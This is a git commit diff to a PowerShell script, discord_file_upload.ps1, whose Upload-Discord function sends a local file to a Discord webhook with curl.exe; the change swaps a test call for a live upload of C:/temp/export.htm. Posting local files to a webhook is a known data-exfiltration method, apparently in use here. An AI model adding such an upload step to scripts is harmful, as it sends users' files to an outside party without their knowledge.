d4fca0d471e796b95dd281a9093840c9c17ade47
AkivaaWhale <43797544+AkivaaWhale@users.noreply.github.com>
2023-01-02 23:21:25 -0500

    Update discord_file_upload.ps1

--- discord_file_upload.ps1
+++ discord_file_upload.ps1
@@ -20,6 +20,5 @@ function Upload-Discord {
     
     if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
     }
-Upload-Discord -text "test"
-
-# Upload-Discord -file "file:///C:/temp/export.htm"
+    
+Upload-Discord -file "file:///C:/temp/export.htm"
